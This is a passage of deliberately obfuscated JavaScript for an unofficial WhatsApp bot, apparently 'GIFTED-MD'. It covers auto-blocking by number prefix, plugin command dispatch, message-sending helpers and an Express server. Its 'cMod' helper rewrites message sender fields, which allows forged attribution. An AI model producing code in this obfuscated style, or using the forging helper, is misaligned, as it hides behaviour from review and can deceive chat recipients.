      if (swrj_jgyt.some(sIZMkXCTyoUfFgT_I_sfMK => jEvGgxcyxSdP.sender.startsWith(sIZMkXCTyoUfFgT_I_sfMK))) {
        await lMIIZyLs$HEldaPIbehjmjV.updateBlockStatus(jEvGgxcyxSdP.sender, "block");
      }
    }
    lMIIZyLs$HEldaPIbehjmjV.cMod = (FuH_Hcdaitn_cVZVOLD, z_GiDMwaOeBKbEfSLxHBymis, HoBJBbHUgXPZ$PfRvhyrBON = "", EMCdLRnPljgDx_XFjxpwazly = lMIIZyLs$HEldaPIbehjmjV.user.id, kRFFS_R = {}) => {
      let aPH_rZplMGSBiDbrPmiSepL$PGn = Object.keys(z_GiDMwaOeBKbEfSLxHBymis.message)[1745 + Math.floor(parseInt(2168)) + Number(-3913)];
      let RAeXzDefn = aPH_rZplMGSBiDbrPmiSepL$PGn === "ephemeralMessage";
      if (RAeXzDefn) {
        aPH_rZplMGSBiDbrPmiSepL$PGn = Object.keys(z_GiDMwaOeBKbEfSLxHBymis.message.ephemeralMessage.message)[Math.ceil(10) * parseInt(569) + parseInt(1991) + parseFloat(parseInt(7681)) * Math.floor(-parseInt(1))];
      }
      let AibYdN$IMQM = RAeXzDefn ? z_GiDMwaOeBKbEfSLxHBymis.message.ephemeralMessage.message : z_GiDMwaOeBKbEfSLxHBymis.message;
      let sUeHYtzRRmUg$I = AibYdN$IMQM[aPH_rZplMGSBiDbrPmiSepL$PGn];
      if (typeof sUeHYtzRRmUg$I === "string") {
        AibYdN$IMQM[aPH_rZplMGSBiDbrPmiSepL$PGn] = HoBJBbHUgXPZ$PfRvhyrBON || sUeHYtzRRmUg$I;
      } else if (sUeHYtzRRmUg$I.caption) {
        sUeHYtzRRmUg$I.caption = HoBJBbHUgXPZ$PfRvhyrBON || sUeHYtzRRmUg$I.caption;
      } else if (sUeHYtzRRmUg$I.text) {
        sUeHYtzRRmUg$I.text = HoBJBbHUgXPZ$PfRvhyrBON || sUeHYtzRRmUg$I.text;
      }
      if (typeof sUeHYtzRRmUg$I !== "string") {
        AibYdN$IMQM[aPH_rZplMGSBiDbrPmiSepL$PGn] = {
          ...sUeHYtzRRmUg$I,
          ...kRFFS_R
        };
      }
      if (z_GiDMwaOeBKbEfSLxHBymis.key.participant) {
        EMCdLRnPljgDx_XFjxpwazly = z_GiDMwaOeBKbEfSLxHBymis.key.participant = EMCdLRnPljgDx_XFjxpwazly || z_GiDMwaOeBKbEfSLxHBymis.key.participant;
      } else if (z_GiDMwaOeBKbEfSLxHBymis.key.participant) {
        EMCdLRnPljgDx_XFjxpwazly = z_GiDMwaOeBKbEfSLxHBymis.key.participant = EMCdLRnPljgDx_XFjxpwazly || z_GiDMwaOeBKbEfSLxHBymis.key.participant;
      }
      if (z_GiDMwaOeBKbEfSLxHBymis.key.remoteJid.includes("@s.whatsapp.net")) {
        EMCdLRnPljgDx_XFjxpwazly = EMCdLRnPljgDx_XFjxpwazly || z_GiDMwaOeBKbEfSLxHBymis.key.remoteJid;
      } else if (z_GiDMwaOeBKbEfSLxHBymis.key.remoteJid.includes("@broadcast")) {
        EMCdLRnPljgDx_XFjxpwazly = EMCdLRnPljgDx_XFjxpwazly || z_GiDMwaOeBKbEfSLxHBymis.key.remoteJid;
      }
      z_GiDMwaOeBKbEfSLxHBymis.key.remoteJid = FuH_Hcdaitn_cVZVOLD;
      z_GiDMwaOeBKbEfSLxHBymis.key.fromMe = EMCdLRnPljgDx_XFjxpwazly === lMIIZyLs$HEldaPIbehjmjV.user.id;
      return proto.WebMessageInfo.fromObject(z_GiDMwaOeBKbEfSLxHBymis);
    };
    lMIIZyLs$HEldaPIbehjmjV.sendTextWithMentions = async (nJ$umtvEov, XwSTDq, ynuDcwBaZOvDqtXx, uTfyP$k_nNRZr = {}) => lMIIZyLs$HEldaPIbehjmjV.sendMessage(nJ$umtvEov, {
      text: XwSTDq,
      contextInfo: {
        mentionedJid: [...XwSTDq.matchAll(/@(\d{0,16})/g)].map(AewWCDdaAwMoqhUX => AewWCDdaAwMoqhUX[parseInt(2011) + -parseInt(2642) + 632] + "@s.whatsapp.net")
      },
      ...uTfyP$k_nNRZr
    }, {
      quoted: ynuDcwBaZOvDqtXx
    });
    lMIIZyLs$HEldaPIbehjmjV.sendImage = async (gNORDoNkbvyCiZFL, MdQWtaxubgvs, aObmJq$sQDCmoUshhdN$H = "", QkAyITJ$Wn = "", RdHgxyE) => {
      let yJLlzWjIncrwDIfx_Urnu = Buffer.isBuffer(MdQWtaxubgvs) ? MdQWtaxubgvs : /^data:.*?\/.*?;base64,/i.test(MdQWtaxubgvs) ? Buffer.from(MdQWtaxubgvs.split`,`[-parseInt(1717) + Math.max(-parseInt(4588), -parseInt(4588)) + 6306], "base64") : /^https?:\/\//.test(MdQWtaxubgvs) ? await await vdKUwcbXJQZBESBInugkFh(MdQWtaxubgvs) : fs.existsSync(MdQWtaxubgvs) ? fs.readFileSync(MdQWtaxubgvs) : Buffer.alloc(-parseInt(3) * Number(parseInt(1318)) + -parseInt(1) * 163 + Math.max(-parseInt(179), -parseInt(179)) * Math.trunc(-parseInt(23)));
      return await lMIIZyLs$HEldaPIbehjmjV.sendMessage(gNORDoNkbvyCiZFL, {
        image: yJLlzWjIncrwDIfx_Urnu,
        caption: aObmJq$sQDCmoUshhdN$H,
        ...RdHgxyE
      }, {
        quoted: QkAyITJ$Wn
      });
    };
    lMIIZyLs$HEldaPIbehjmjV.sendText = (imSO_KQZcyXg_tjWIdVihxLOQ, jPpHsxGO_yEsToOxAOV, IXdwF$PP = "", epOLhzyesAXR) => lMIIZyLs$HEldaPIbehjmjV.sendMessage(imSO_KQZcyXg_tjWIdVihxLOQ, {
      text: jPpHsxGO_yEsToOxAOV,
      ...epOLhzyesAXR
    }, {
      quoted: IXdwF$PP
    });
    lMIIZyLs$HEldaPIbehjmjV.sendButtonText = (vqhV$Jo$VxaAChhShWecJDu, pqhrUrJIaYpEdHJ$U = [], krGLV_xGClwsl$X, mUsEbsLxdWJatyOVRPZT, IAsyI_dehA$jTayJvEkicX = "", tbhVOEBHyyLoB$E = {}) => {
      let NMXvpmOoTP$dacdfR = {
        text: krGLV_xGClwsl$X,
        footer: mUsEbsLxdWJatyOVRPZT,
        buttons: pqhrUrJIaYpEdHJ$U,
        headerType: 2,
        ...tbhVOEBHyyLoB$E
      };
      lMIIZyLs$HEldaPIbehjmjV.sendMessage(vqhV$Jo$VxaAChhShWecJDu, NMXvpmOoTP$dacdfR, {
        quoted: IAsyI_dehA$jTayJvEkicX,
        ...tbhVOEBHyyLoB$E
      });
    };
    lMIIZyLs$HEldaPIbehjmjV.send5ButImg = async (sTm_aZkUYeNISGXXlI_S, I$$cAGZici = "", Xxt$GEhszwiuZfnAdeByjmkj = "", CVajU_hzSmguE, JqQpHpPgeEK__xDeJy = [], N__NnjANJSmDT, puGMQ = {}) => {
      let lONnobiKvAJA_AiaDjaD = await prepareWAMessageMedia({
        image: CVajU_hzSmguE,
        jpegThumbnail: N__NnjANJSmDT
      }, {
        upload: lMIIZyLs$HEldaPIbehjmjV.waUploadToServer
      });
      var FkXUe_z = generateWAMessageFromContent(sTm_aZkUYeNISGXXlI_S, proto.Message.fromObject({
        templateMessage: {
          hydratedTemplate: {
            imageMessage: lONnobiKvAJA_AiaDjaD.imageMessage,
            hydratedContentText: I$$cAGZici,
            hydratedFooterText: Xxt$GEhszwiuZfnAdeByjmkj,
            hydratedButtons: JqQpHpPgeEK__xDeJy
          }
        }
      }), puGMQ);
      lMIIZyLs$HEldaPIbehjmjV.relayMessage(sTm_aZkUYeNISGXXlI_S, FkXUe_z.message, {
        messageId: FkXUe_z.key.id
      });
    };
    const QqAqaq$PntByw_vAKLj = require("./gift");
    const zIqsKvO$hCfzVbKZccACPhnBY = require("events");
    zIqsKvO$hCfzVbKZccACPhnBY.defaultMaxListeners = -parseInt(1142) * -parseInt(9) + Number(-10999) + parseFloat(parseInt(10721));
    const JjZPhI = ee_$zGWseTZSt ? oqRkfvxskIL_DgLkUyyOlCji.slice(parseInt(314) * parseInt(25) + -parseInt(5027) * 1 + Math.trunc(-83) * parseInt(34)).trim().split(" ")[Number(6056) * -parseInt(1) + Math.trunc(parseInt(4297)) + Math.ceil(parseInt(1759))].toLowerCase() : false;
    if (ee_$zGWseTZSt) {
      const EKxWXozsJcsRGE$Ay_PooQ = QqAqaq$PntByw_vAKLj.commands.find(V_jzYevOeXkqPwf_zMOuDqIjeCB => V_jzYevOeXkqPwf_zMOuDqIjeCB.pattern === JjZPhI) || QqAqaq$PntByw_vAKLj.commands.find(VTlqRf => VTlqRf.alias && VTlqRf.alias.includes(JjZPhI));
      if (EKxWXozsJcsRGE$Ay_PooQ) {
        if (EKxWXozsJcsRGE$Ay_PooQ.react) {
          lMIIZyLs$HEldaPIbehjmjV.sendMessage(XRCKThRbqlYKT_lVVAI, {
            react: {
              text: EKxWXozsJcsRGE$Ay_PooQ.react,
              key: hvNEkue_GQYljUBFsPz.key
            }
          });
        }
        try {
          EKxWXozsJcsRGE$Ay_PooQ.function(lMIIZyLs$HEldaPIbehjmjV, hvNEkue_GQYljUBFsPz, jEvGgxcyxSdP, {
            from: XRCKThRbqlYKT_lVVAI,
            quoted: Cibb$XNdL,
            body: oqRkfvxskIL_DgLkUyyOlCji,
            isCmd: ee_$zGWseTZSt,
            command: RlXerfBIMG,
            args: wTBjHplNYRjMAKXcRF_e,
            q: Hv_kZ$YrdjacQ,
            isGroup: GmwbkLvBuyfw,
            sender: c_WJlSLuUZOkXPpINeP,
            senderNumber: CxOhPIe_RKTUNL,
            botNumber2: jLiNMIU,
            botNumber: xx_uDT_kGnmriOHdGLLxQloSj,
            pushname: gMCWtDPGwaCBCFWvIIpdt,
            isMe: EZPHCupwgk,
            isOwner: wUQLTFzGn$l,
            groupMetadata: HatEgyx_Ihqp,
            groupName: xzlWuvLsHyVCDz,
            participants: euXi$iqs,
            groupAdmins: rnHDtCFd$n,
            isBotAdmins: HhZ_irISQUElxo_GtvlBlU,
            isAdmins: bdwljZbbAnoqHrTSkeigiaHDe,
            reply: omjmYmlTazK
          });
        } catch (keBepo$$KAFiGUzk) {
          console.error("[GIFTED-MD PLUGIN ERROR]: " + keBepo$$KAFiGUzk);
          lMIIZyLs$HEldaPIbehjmjV.sendMessage(XRCKThRbqlYKT_lVVAI, {
            text: "[GIFTED-MD PLUGIN ERROR]:\n" + keBepo$$KAFiGUzk
          });
        }
      }
    }
    QqAqaq$PntByw_vAKLj.commands.map(async f$ZzxWFSyjuZHBbaTsaCHW => {
      if (oqRkfvxskIL_DgLkUyyOlCji && f$ZzxWFSyjuZHBbaTsaCHW.on === "body") {
        f$ZzxWFSyjuZHBbaTsaCHW.function(lMIIZyLs$HEldaPIbehjmjV, hvNEkue_GQYljUBFsPz, jEvGgxcyxSdP, {
          from: XRCKThRbqlYKT_lVVAI,
          quoted: Cibb$XNdL,
          body: oqRkfvxskIL_DgLkUyyOlCji,
          isCmd: ee_$zGWseTZSt,
          command: f$ZzxWFSyjuZHBbaTsaCHW,
          args: wTBjHplNYRjMAKXcRF_e,
          q: Hv_kZ$YrdjacQ,
          isGroup: GmwbkLvBuyfw,
          sender: c_WJlSLuUZOkXPpINeP,
          senderNumber: CxOhPIe_RKTUNL,
          botNumber2: jLiNMIU,
          botNumber: xx_uDT_kGnmriOHdGLLxQloSj,
          pushname: gMCWtDPGwaCBCFWvIIpdt,
          isMe: EZPHCupwgk,
          isOwner: wUQLTFzGn$l,
          groupMetadata: HatEgyx_Ihqp,
          groupName: xzlWuvLsHyVCDz,
          participants: euXi$iqs,
          groupAdmins: rnHDtCFd$n,
          isBotAdmins: HhZ_irISQUElxo_GtvlBlU,
          isAdmins: bdwljZbbAnoqHrTSkeigiaHDe,
          reply: omjmYmlTazK
        });
      } else if (hvNEkue_GQYljUBFsPz.q && f$ZzxWFSyjuZHBbaTsaCHW.on === "text") {
        f$ZzxWFSyjuZHBbaTsaCHW.function(lMIIZyLs$HEldaPIbehjmjV, hvNEkue_GQYljUBFsPz, jEvGgxcyxSdP, {
          from: XRCKThRbqlYKT_lVVAI,
          quoted: Cibb$XNdL,
          body: oqRkfvxskIL_DgLkUyyOlCji,
          isCmd: ee_$zGWseTZSt,
          command: f$ZzxWFSyjuZHBbaTsaCHW,
          args: wTBjHplNYRjMAKXcRF_e,
          q: Hv_kZ$YrdjacQ,
          isGroup: GmwbkLvBuyfw,
          sender: c_WJlSLuUZOkXPpINeP,
          senderNumber: CxOhPIe_RKTUNL,
          botNumber2: jLiNMIU,
          botNumber: xx_uDT_kGnmriOHdGLLxQloSj,
          pushname: gMCWtDPGwaCBCFWvIIpdt,
          isMe: EZPHCupwgk,
          isOwner: wUQLTFzGn$l,
          groupMetadata: HatEgyx_Ihqp,
          groupName: xzlWuvLsHyVCDz,
          participants: euXi$iqs,
          groupAdmins: rnHDtCFd$n,
          isBotAdmins: HhZ_irISQUElxo_GtvlBlU,
          isAdmins: bdwljZbbAnoqHrTSkeigiaHDe,
          reply: omjmYmlTazK
        });
      } else if ((f$ZzxWFSyjuZHBbaTsaCHW.on === "image" || f$ZzxWFSyjuZHBbaTsaCHW.on === "photo") && hvNEkue_GQYljUBFsPz.type === "imageMessage") {
        f$ZzxWFSyjuZHBbaTsaCHW.function(lMIIZyLs$HEldaPIbehjmjV, hvNEkue_GQYljUBFsPz, jEvGgxcyxSdP, {
          from: XRCKThRbqlYKT_lVVAI,
          quoted: Cibb$XNdL,
          body: oqRkfvxskIL_DgLkUyyOlCji,
          isCmd: ee_$zGWseTZSt,
          command: f$ZzxWFSyjuZHBbaTsaCHW,
          args: wTBjHplNYRjMAKXcRF_e,
          q: Hv_kZ$YrdjacQ,
          isGroup: GmwbkLvBuyfw,
          sender: c_WJlSLuUZOkXPpINeP,
          senderNumber: CxOhPIe_RKTUNL,
          botNumber2: jLiNMIU,
          botNumber: xx_uDT_kGnmriOHdGLLxQloSj,
          pushname: gMCWtDPGwaCBCFWvIIpdt,
          isMe: EZPHCupwgk,
          isOwner: wUQLTFzGn$l,
          groupMetadata: HatEgyx_Ihqp,
          groupName: xzlWuvLsHyVCDz,
          participants: euXi$iqs,
          groupAdmins: rnHDtCFd$n,
          isBotAdmins: HhZ_irISQUElxo_GtvlBlU,
          isAdmins: bdwljZbbAnoqHrTSkeigiaHDe,
          reply: omjmYmlTazK
        });
      } else if (f$ZzxWFSyjuZHBbaTsaCHW.on === "sticker" && hvNEkue_GQYljUBFsPz.type === "stickerMessage") {
        f$ZzxWFSyjuZHBbaTsaCHW.function(lMIIZyLs$HEldaPIbehjmjV, hvNEkue_GQYljUBFsPz, jEvGgxcyxSdP, {
          from: XRCKThRbqlYKT_lVVAI,
          quoted: Cibb$XNdL,
          body: oqRkfvxskIL_DgLkUyyOlCji,
          isCmd: ee_$zGWseTZSt,
          command: f$ZzxWFSyjuZHBbaTsaCHW,
          args: wTBjHplNYRjMAKXcRF_e,
          q: Hv_kZ$YrdjacQ,
          isGroup: GmwbkLvBuyfw,
          sender: c_WJlSLuUZOkXPpINeP,
          senderNumber: CxOhPIe_RKTUNL,
          botNumber2: jLiNMIU,
          botNumber: xx_uDT_kGnmriOHdGLLxQloSj,
          pushname: gMCWtDPGwaCBCFWvIIpdt,
          isMe: EZPHCupwgk,
          isOwner: wUQLTFzGn$l,
          groupMetadata: HatEgyx_Ihqp,
          groupName: xzlWuvLsHyVCDz,
          participants: euXi$iqs,
          groupAdmins: rnHDtCFd$n,
          isBotAdmins: HhZ_irISQUElxo_GtvlBlU,
          isAdmins: bdwljZbbAnoqHrTSkeigiaHDe,
          reply: omjmYmlTazK
        });
      }
    });
  });
}
setTimeout(() => {
  ConnectGiftedToWA();
}, parseFloat(parseInt(3)) * 557 + Math.max(-parseInt(2), -2) * -4260 + parseInt(151) * -41);
app.get("/", (uBEZXcEIHFgqm, CkenQZQlUR) => {
  CkenQZQlUR.sendFile(path.join(__dirname, "./gift/gifted.html"));
});
app.listen(port, () => console.log("Gifted Server Live on http://localhost:" + port)); // GIFTED-TECH@2024